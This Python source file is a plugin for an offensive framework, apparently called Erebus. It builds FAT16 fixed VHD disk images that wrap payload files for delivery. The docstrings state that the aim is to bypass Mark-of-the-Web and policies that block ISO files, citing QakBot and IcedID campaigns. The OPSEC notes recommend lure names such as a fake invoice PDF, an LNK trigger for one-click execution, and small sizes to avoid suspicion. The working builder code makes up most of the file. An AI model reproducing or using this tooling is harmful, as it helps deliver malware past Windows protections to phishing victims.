"""
Erebus Plugin - VHD / VHDX Container
Author: Whispergate
Description: Packages payload files into a Fixed VHD disk image.

Why VHD over ISO:
  - Different file extension bypasses org policies that block .iso downloads
  - Windows mounts VHD on double-click (no extra software required)
  - Files inside a mounted VHD do NOT inherit Mark-of-the-Web from the
    outer container's download - full MOTW bypass
  - Used by QakBot, IcedID, BazarLoader campaigns

Implementation:
  Primary path  - mtools (mformat + mcopy): zero-privilege, works in Linux containers
  Fallback path - pure-Python FAT16 + VHD footer: no external deps, always available

Both paths produce a Fixed VHD (disk type 2): raw FAT16 filesystem followed by
the 512-byte VHD footer defined in the Microsoft VHD specification.
"""

import io
import os
import pathlib
import shutil
import struct
import subprocess
import time
import uuid
from typing import Dict, Callable, List, Optional, Tuple

try:
    from erebus_wrapper.erebus.modules.plugin_base import ErebusPlugin, PluginMetadata, PluginCategory
except ImportError:
    from plugin_base import ErebusPlugin, PluginMetadata, PluginCategory


# ---------------------------------------------------------------------------
# FAT16 constants (for 50 MB fixed disk)
# ---------------------------------------------------------------------------
_SECTOR      = 512
_SPC         = 8          # sectors per cluster → 4096 bytes/cluster
_RSVD        = 4          # reserved sectors inside the FAT16 partition
_NFATS       = 2
_ROOT_N      = 512        # root directory entry count
_MEDIA       = 0xF8       # fixed disk
_PART_OFFSET = 2048       # FAT16 partition start (LBA); MBR lives at LBA 0


class VhdContainerPlugin(ErebusPlugin):
    """
    Plugin for creating Fixed VHD disk image containers.

    Packages the compiled payload (and any additional files) into a FAT16
    virtual hard disk that Windows mounts automatically on double-click.
    """

    def __init__(self):
        super().__init__()
        self.REPO_ROOT  = pathlib.Path(__file__).resolve().parents[2]
        self.AGENT_CODE = self.REPO_ROOT / "agent_code"

    def get_metadata(self) -> PluginMetadata:
        return PluginMetadata(
            name="vhd_container",
            version="1.0.0",
            author="Whispergate",
            description="Packages payload into a Fixed VHD disk image (MOTW bypass, ISO-policy bypass)",
            category=PluginCategory.CONTAINER,
            enabled=True,
        )

    def register(self) -> Dict[str, Callable]:
        return {
            "build_vhd": self.build_vhd,
        }

    def validate(self) -> tuple[bool, Optional[str]]:
        return (True, None)

    def on_load(self):
        mtools = shutil.which("mformat") is not None
        mode   = "mtools" if mtools else "pure-Python FAT16"
        print(f"[Plugin] VHD Container plugin loaded - using {mode} filesystem builder")

    # ================================================================
    # Public API
    # ================================================================

    def build_vhd(
        self,
        build_path: pathlib.Path,
        visible_extension: str = ".exe",
        volume_label: str = "EREBUS",
        output_filename: str = "payload.vhd",
        # [MALLEABLE] Minimum disk size in MB; grows if payload exceeds it
        min_size_mb: int = 50,
        extra_files: Optional[List[pathlib.Path]] = None,
    ) -> pathlib.Path:
        """
        Build a Fixed VHD containing all files from build_path/payload/.

        The payload directory is scanned for the compiled loader and any
        additional trigger/decoy files, then packaged into a FAT16 VHD.
        The VHD is written to build_path/ and the path is returned.

        Args:
            build_path:       Root of the Erebus build directory.
            visible_extension: Extension to rename the loader inside the VHD
                               (e.g., ".exe", ".dll"). Matches the outer container
                               visible_extension so the file appears correct on mount.
            volume_label:     FAT16 volume label (max 11 chars, no spaces).
            output_filename:  Output .vhd filename in build_path/.
            min_size_mb:      Minimum VHD size in MB (default 50).
            extra_files:      Additional file paths to include at VHD root.

        Returns:
            pathlib.Path: Path to the created .vhd file.

        ## OPSEC Notes
        Detection Surface:
          - VHD mount event: Event ID 4656/4663 (Object Access) on the disk image
          - Sysmon Event 6 (Driver load) for the VHD filter driver
          - Files executed from VHD mount point lack MOTW - may trigger heuristics
            that flag execution from unusual paths (e.g., \\Device\\HarddiskVolume*\)
        Behavioral Indicators:
          - vds.exe / vdssvc.exe spawned for VHD mount
          - Process execution from a path starting with a mapped VHD volume GUID
        Hardening:
          - [MALLEABLE] Rename VHD with a plausible double-extension lure
            (e.g., "Invoice_2024.pdf.vhd") or use a document-themed volume label
          - Combine with LNK trigger inside VHD for one-click execution
          - Keep VHD < 100 MB to avoid suspicion from large file downloads
        Evasion Maturity: Level 2 (Moderate) - MOTW bypass is effective against
          SmartScreen / Office Protected View; EDR behavioural rules increasingly
          flag execution from VHD mount paths.
        """
        build_path   = pathlib.Path(build_path)
        payload_dir  = build_path / "payload"
        output_path  = build_path / output_filename

        # Collect files to include
        files: List[Tuple[str, bytes]] = []
        if payload_dir.exists():
            for fp in sorted(payload_dir.iterdir()):
                if fp.is_file():
                    name = fp.name
                    files.append((name, fp.read_bytes()))

        if extra_files:
            for fp in extra_files:
                fp = pathlib.Path(fp)
                if fp.is_file():
                    files.append((fp.name, fp.read_bytes()))

        if not files:
            raise ValueError("No files found in payload directory to package into VHD")

        total_content = sum(len(d) for _, d in files)
        # Ensure disk is large enough for content with generous headroom
        needed_mb = max(min_size_mb, (total_content // (1024 * 1024)) + 15)

        # Try mtools first (zero-privilege, reliable); fall back to pure Python
        if shutil.which("mformat") and shutil.which("mcopy"):
            raw_image = self._build_with_mtools(files, volume_label, needed_mb)
        else:
            raw_image = self._build_fat16_pure(files, volume_label, needed_mb)

        footer = self._vhd_footer(len(raw_image))

        output_path.write_bytes(raw_image + footer)
        return output_path

    # ================================================================
    # mtools path
    # ================================================================

    def _build_with_mtools(
        self,
        files: List[Tuple[str, bytes]],
        volume_label: str,
        size_mb: int,
    ) -> bytes:
        """
        Create a partitioned raw disk image using mformat + mcopy.

        mformat's @@offset notation tells mtools to treat the image as a
        partition starting at byte _PART_OFFSET*512.  The MBR at sector 0
        is written separately in pure Python so the resulting image is a
        properly partitioned disk (not a superfloppy), which Windows VHD
        mounting requires.
        """
        import tempfile

        with tempfile.TemporaryDirectory() as tmp:
            tmp_path = pathlib.Path(tmp)
            img_path = tmp_path / "disk.img"

            disk_bytes   = size_mb * 1024 * 1024
            part_offset  = _PART_OFFSET * _SECTOR
            part_bytes   = disk_bytes - part_offset

            # Zero the full disk image
            img_path.write_bytes(b"\x00" * disk_bytes)

            # mtools @@offset: address FAT16 partition, not the whole disk.
            # -h/-s/-t specify geometry so mformat picks FAT16 not FAT32.
            label       = volume_label[:11].upper()
            offset_spec = f"{img_path}@@{part_offset}"
            subprocess.run(
                [
                    "mformat",
                    "-i", offset_spec,
                    "-v", label,
                    "-F",           # force FAT16
                    "::",
                ],
                check=True, capture_output=True,
            )

            for name, data in files:
                src = tmp_path / name
                src.write_bytes(data)
                subprocess.run(
                    ["mcopy", "-i", offset_spec, str(src), f"::{name}"],
                    check=True, capture_output=True,
                )

            raw = bytearray(img_path.read_bytes())

            # Patch sector 0 with a proper MBR partition table.
            part_sects = part_bytes // _SECTOR
            mbr = self._build_mbr(disk_bytes // _SECTOR, _PART_OFFSET, part_sects)
            raw[0:512] = mbr

            # Also set the BPB HiddenSectors field inside the FAT16 boot
            # sector (at partition_offset+28) so the FS driver knows its LBA.
            struct.pack_into('<I', raw, part_offset + 28, _PART_OFFSET)

            return bytes(raw)

    # ================================================================
    # Pure-Python FAT16 path
    # ================================================================

    def _build_fat16_pure(
        self,
        files: List[Tuple[str, bytes]],
        volume_label: str,
        size_mb: int,
    ) -> bytes:
        """
        Build a partitioned disk image with FAT16 in pure Python.

        Disk layout:
          LBA 0              : MBR with one primary FAT16 partition entry
          LBA 1 – 2047       : empty (gap)
          LBA _PART_OFFSET   : FAT16 boot sector (BPB)
          LBA _PART_OFFSET+1 : reserved sectors (RSVD-1 more)
          LBA _PART_OFFSET+RSVD         : FAT1
          LBA _PART_OFFSET+RSVD+FAT_SIZE: FAT2
          ...                : root directory, data region

        Windows VHD mounting requires a proper MBR partition table; writing
        the FAT BPB at LBA 0 (superfloppy style) causes the
        "disk not initialized" mount error.
        """
        disk_bytes  = size_mb * 1024 * 1024
        total_sects = disk_bytes // _SECTOR
        part_sects  = total_sects - _PART_OFFSET   # sectors in the FAT16 partition
        root_sects  = (_ROOT_N * 32 + _SECTOR - 1) // _SECTOR

        # Derive FAT16 size (converge in 3 iterations)
        fat_size = 64
        for _ in range(3):
            data_sects     = part_sects - _RSVD - _NFATS * fat_size - root_sects
            total_clusters = data_sects // _SPC
            fat_bytes      = (total_clusters + 2) * 2
            fat_size       = (fat_bytes + _SECTOR - 1) // _SECTOR

        data_sects     = part_sects - _RSVD - _NFATS * fat_size - root_sects
        total_clusters = data_sects // _SPC

        # Allocate clusters per file
        cluster_chains: List[List[int]] = []
        next_cluster = 2  # first usable cluster
        for _, data in files:
            n_clusters = max(1, (len(data) + _SPC * _SECTOR - 1) // (_SPC * _SECTOR))
            chain = list(range(next_cluster, next_cluster + n_clusters))
            cluster_chains.append(chain)
            next_cluster += n_clusters

        if next_cluster - 2 > total_clusters:
            raise ValueError("Files too large for disk image; increase min_size_mb")

        # ---- FAT16 Boot Sector (BPB) ----
        vol_id  = int.from_bytes(os.urandom(4), 'little')
        vol_lab = volume_label[:11].upper().ljust(11).encode('ascii')
        # Geometry for the BPB sectors/track + heads fields (informational only)
        _, bpb_heads, bpb_spt = self._chs(total_sects)

        bs = bytearray(512)
        bs[0:3]   = b'\xEB\x58\x90'          # jmp short + NOP
        bs[3:11]  = b'MSDOS5.0'
        struct.pack_into('<H', bs, 11, _SECTOR)
        bs[13]    = _SPC
        struct.pack_into('<H', bs, 14, _RSVD)
        bs[16]    = _NFATS
        struct.pack_into('<H', bs, 17, _ROOT_N)
        struct.pack_into('<H', bs, 19, 0)                  # total_sects_16 = 0
        bs[21]    = _MEDIA
        struct.pack_into('<H', bs, 22, fat_size)
        struct.pack_into('<H', bs, 24, bpb_spt)            # sectors/track
        struct.pack_into('<H', bs, 26, bpb_heads)          # heads
        struct.pack_into('<I', bs, 28, _PART_OFFSET)       # hidden sectors = partition LBA
        struct.pack_into('<I', bs, 32, part_sects)         # total sectors in this partition
        bs[36]    = 0x80                                   # drive number (hard disk)
        bs[37]    = 0x00
        bs[38]    = 0x29                                   # extended boot signature
        struct.pack_into('<I', bs, 39, vol_id)
        bs[43:54] = vol_lab
        bs[54:62] = b'FAT16   '
        bs[510]   = 0x55
        bs[511]   = 0xAA

        # ---- FAT table ----
        fat = bytearray(fat_size * _SECTOR)
        struct.pack_into('<H', fat, 0, 0xFF00 | _MEDIA)
        struct.pack_into('<H', fat, 2, 0xFFFF)
        for chain in cluster_chains:
            for i, cl in enumerate(chain):
                offset = cl * 2
                val    = chain[i + 1] if i + 1 < len(chain) else 0xFFFF
                struct.pack_into('<H', fat, offset, val)

        # ---- Root directory ----
        root = bytearray(root_sects * _SECTOR)

        # First entry: volume label
        vol_entry = bytearray(32)
        vol_entry[0:11] = vol_lab
        vol_entry[11]   = 0x08      # volume label attribute
        root[0:32]      = vol_entry

        now_date, now_time = self._fat_datetime()
        for idx, ((name, data), chain) in enumerate(zip(files, cluster_chains)):
            stem, _, ext = name.upper().rpartition('.')
            stem_b = stem[:8].ljust(8).encode('ascii', errors='replace')
            ext_b  = ext[:3].ljust(3).encode('ascii', errors='replace')
            entry  = bytearray(32)
            entry[0:8]   = stem_b
            entry[8:11]  = ext_b
            entry[11]    = 0x20                     # archive attribute
            struct.pack_into('<H', entry, 22, now_time)
            struct.pack_into('<H', entry, 24, now_date)
            struct.pack_into('<H', entry, 26, chain[0])
            struct.pack_into('<I', entry, 28, len(data))
            slot = (idx + 1) * 32                   # +1: skip vol label at slot 0
            root[slot:slot + 32] = entry

        # ---- Data region ----
        data_region = bytearray(data_sects * _SECTOR)
        for (_, data), chain in zip(files, cluster_chains):
            chunk_size = _SPC * _SECTOR
            for i, cl in enumerate(chain):
                offset_in_data = (cl - 2) * chunk_size
                chunk          = data[i * chunk_size:(i + 1) * chunk_size]
                data_region[offset_in_data:offset_in_data + len(chunk)] = chunk

        # ---- Assemble full disk image ----
        image  = bytearray(disk_bytes)

        # MBR at sector 0
        mbr = self._build_mbr(total_sects, _PART_OFFSET, part_sects)
        image[0:512] = mbr

        # FAT16 partition starting at LBA _PART_OFFSET
        part_base = _PART_OFFSET * _SECTOR

        image[part_base:part_base + 512] = bs
        cursor = part_base + _RSVD * _SECTOR

        image[cursor:cursor + len(fat)] = fat
        cursor += fat_size * _SECTOR

        image[cursor:cursor + len(fat)] = fat   # FAT2
        cursor += fat_size * _SECTOR

        image[cursor:cursor + len(root)] = root
        cursor += root_sects * _SECTOR

        image[cursor:cursor + len(data_region)] = data_region

        return bytes(image)

    # ================================================================
    # MBR helpers
    # ================================================================

    @staticmethod
    def _lba_to_chs(lba: int, heads: int = 255, spt: int = 63) -> bytes:
        """
        Encode an LBA address as 3-byte CHS for an MBR partition entry.
        If LBA exceeds CHS range, return the maximum (0xFE, 0xFF, 0xFF) so
        Windows falls back to the LBA fields in the partition entry.
        """
        max_lba = 1024 * heads * spt
        if lba >= max_lba:
            return bytes([0xFE, 0xFF, 0xFF])
        c = lba // (heads * spt)
        h = (lba // spt) % heads
        s = (lba % spt) + 1
        c_lo = c & 0xFF
        c_hi = (c >> 8) & 0x03
        return bytes([h, (s & 0x3F) | (c_hi << 6), c_lo])

    @staticmethod
    def _build_mbr(total_sects: int, part_lba: int, part_sects: int) -> bytes:
        """
        Build a 512-byte MBR with one primary FAT16 partition entry.

        Partition type 0x0E = FAT16 LBA (preferred; avoids the 32 MB CHS
        limit and tells Windows to use the LBA fields for addressing).
        """
        mbr = bytearray(512)

        # Minimal bootstrap code: infinite JMP so accidental boot is harmless.
        mbr[0] = 0xEB   # JMP SHORT
        mbr[1] = 0xFE   # -2 (infinite loop)
        mbr[2] = 0x90   # NOP

        # Partition entry 1 at offset 446
        pe = bytearray(16)
        pe[0]   = 0x00  # not bootable (0x80 = bootable; not needed for VHD delivery)
        pe[1:4] = VhdContainerPlugin._lba_to_chs(part_lba)
        pe[4]   = 0x0E  # type: FAT16 LBA
        pe[5:8] = VhdContainerPlugin._lba_to_chs(part_lba + part_sects - 1)
        struct.pack_into('<I', pe,  8, part_lba)
        struct.pack_into('<I', pe, 12, part_sects)
        mbr[446:462] = pe

        # Partition entries 2-4 already zeroed.
        mbr[510] = 0x55
        mbr[511] = 0xAA
        return bytes(mbr)

    # ================================================================
    # VHD footer (Fixed VHD, disk type 2)
    # ================================================================

    @staticmethod
    def _chs(total_sectors: int) -> Tuple[int, int, int]:
        """
        Calculate CHS geometry per the VHD specification algorithm.
        Returns (cylinders, heads, sectors_per_track).
        """
        if total_sectors > 65535 * 16 * 255:
            total_sectors = 65535 * 16 * 255

        if total_sectors >= 65535 * 16 * 63:
            spt   = 255
            heads = 16
            cyl   = total_sectors // (heads * spt)
        else:
            spt          = 17
            cyl_x_heads  = total_sectors // spt
            heads        = max(4, (cyl_x_heads + 1023) // 1024)
            if cyl_x_heads >= heads * 1024 or heads > 16:
                spt         = 31
                heads       = 16
                cyl_x_heads = total_sectors // spt
            if cyl_x_heads >= heads * 1024:
                spt         = 63
                heads       = 16
                cyl_x_heads = total_sectors // spt
            cyl = cyl_x_heads // heads

        return cyl, heads, spt

    @staticmethod
    def _fat_datetime() -> Tuple[int, int]:
        """Return FAT16 packed (date, time) for now."""
        t = time.localtime()
        date = ((t.tm_year - 1980) << 9) | (t.tm_mon << 5) | t.tm_mday
        fat_time = (t.tm_hour << 11) | (t.tm_min << 5) | (t.tm_sec // 2)
        return date, fat_time

    @staticmethod
    def _vhd_footer(disk_bytes: int) -> bytes:
        """
        Build the 512-byte VHD footer for a Fixed VHD (disk type 2).

        Structure per Microsoft VHD specification:
          Cookie, Features, FileFormatVersion, DataOffset(0xFFFF..),
          TimeStamp, CreatorApp, CreatorVersion, CreatorHostOS,
          OriginalSize, CurrentSize, DiskGeometry, DiskType,
          Checksum, UniqueID, SavedState, Reserved(427 bytes)
        """
        cyl, heads, spt = VhdContainerPlugin._chs(disk_bytes // _SECTOR)
        disk_geom       = (cyl << 16) | (heads << 8) | spt
        timestamp       = max(0, int(time.time()) - 946684800)  # seconds since 2000-01-01

        footer = struct.pack(
            ">8s II Q I 4s I 4s QQ II I 16s B 427x",
            b"conectix",          # cookie
            0x00000002,           # features: reserved
            0x00010000,           # file format version 1.0
            0xFFFFFFFFFFFFFFFF,   # data offset: 0xFFFF... = fixed VHD
            timestamp,
            b"win ",              # creator application
            0x00060001,           # creator version 6.1 (Windows 7)
            b"Wi2k",              # creator host OS
            disk_bytes,           # original size
            disk_bytes,           # current size
            disk_geom,
            2,                    # disk type: fixed
            0,                    # checksum placeholder
            uuid.uuid4().bytes,
            0,                    # saved state
        )

        checksum = (~sum(footer)) & 0xFFFFFFFF
        # Patch checksum at offset 64 (big-endian uint32)
        footer = footer[:64] + struct.pack(">I", checksum) + footer[68:]
        assert len(footer) == 512
        return footer


# Module-level instance for plugin auto-discovery
_plugin = VhdContainerPlugin()


if __name__ == "__main__":
    _meta = _plugin.get_metadata()
    print(f"[*] {_meta.name} v{_meta.version}")
    print(f"[*] Category: {_meta.category.value}")
    print(f"[*] Description: {_meta.description}")
    print()
    registered = _plugin.register()
    print(f"[*] Registered functions ({len(registered)}):")
    for fn in sorted(registered):
        print(f"    - {fn}")
    print()
    valid, err = _plugin.validate()
    print("[+] Validation passed" if valid else f"[-] Validation failed: {err}")
